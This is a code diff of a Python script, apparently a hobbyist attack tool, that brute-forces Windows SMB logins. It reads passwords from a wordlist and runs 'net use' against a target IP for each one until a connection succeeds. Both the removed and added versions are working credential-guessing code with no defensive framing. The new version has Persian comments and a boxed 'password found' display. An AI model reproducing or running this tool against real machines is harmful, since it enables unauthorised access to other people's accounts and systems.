@@ -1,55 +1,46 @@
 import os
+import shutil
 from tqdm import tqdm
-from colorama import Fore, Style, init
-import banners
 
-# Initialize colorama
-init()
-os.system('title @peymanx Windows Login Password Brute-force attack')
-banners.windows_login()
+# مسیر فایل متنی که پسوردها در آن قرار دارند
+password_file_path = 'passwords.txt'
 
-def connect_to_smb(ip, username, password):
-    command = f'net use \\\\{ip} /user:{username} {password} >nul 2>&1'
+# آدرس IP که می‌خواهید به آن متصل شوید
+ip_address = '127.0.0.1'
+
+# نام کاربری مورد نظر
+username = 'ali'
+
+# باز کردن فایل و خواندن پسوردها
+with open(password_file_path, 'r') as file:
+    passwords = file.readlines()
+
+# متغیر کمکی برای بررسی پیدا شدن پسورد
+password_found = False
+
+# تابع برای نمایش باکس
+def print_box(message):
+    columns = shutil.get_terminal_size().columns
+    box_width = columns - 4
+    print()
+    print(f'╔{"═" * box_width}╗')
+    print(f'║{" " * box_width}║')
+    print(f'║{message.center(box_width)}║')
+    print(f'║{" " * box_width}║')
+    print(f'╚{"═" * box_width}╝')
+
+# اجرای دستور برای هر پسورد تا زمانی که اتصال موفقیت‌آمیز باشد
+for password in tqdm(passwords, desc="Trying passwords"):
+    password = password.strip()  # حذف کاراکترهای اضافی مانند \n
+    tqdm.write(f'Trying password: {password}')  # نمایش پسوردی که امتحان می‌شود
+    command = f'net use \\\\{ip_address} /user:{username} {password} >nul 2>&1'
     result = os.system(command)
-    return result == 0
 
-def disconnect(ip):
-    command = f'net use \\\\{ip} /delete >nul 2>&1'
-    result = os.system(command)
+    if result == 0:  # اگر اتصال موفقیت‌آمیز بود
+        print_box(f'Password found: {password}')
+        os.system(f'net use \\\\{ip_address} /delete >nul 2>&1')
+        password_found = True
+        break
 
-def read_passwords(file_path):
-    with open(file_path, 'r') as file:
-        passwords = file.readlines()
-    return [password.strip() for password in passwords]
-
-def main():
-    ip = '127.0.0.1'
-    username = 'peyman'
-    password_file = './passwords/10k.txt'
-
-    passwords = read_passwords(password_file)
-    total_passwords = len(passwords)
-    
-    print(f"IP Address: {ip}")
-    print(f"Username: {username}")
-    print(f"Password: **********")
-
-    max_password_length = max(len(password) for password in passwords)
-    with tqdm(total=total_passwords, desc="Trying passwords", unit="p") as pbar:
-        for password in passwords:
-            padded_password = password.ljust(max_password_length)
-            pbar.set_description(f"{Fore.YELLOW}Trying password: {padded_password}{Style.RESET_ALL}")
-            if connect_to_smb(ip, username, password):
-                print(f'\n{Fore.GREEN}{"*"*70}')
-                print(f'{Fore.GREEN}Successfully connected!')  # Blinking text
-                print(f'{Fore.GREEN}Password: \'\033[5m{password}\033[0m{Fore.GREEN}\'')  # Blinking text
-                print(f'{Fore.GREEN}{"*"*70}{Style.RESET_ALL}\n')
-                break
-            pbar.update(1)
-        else:
-            print(f'\n{Fore.RED}Password not found{Style.RESET_ALL}')
-    
-    disconnect(ip)
-
-if __name__ == '__main__':
-    main()
+if not password_found:
+    print_box('Password not found!')
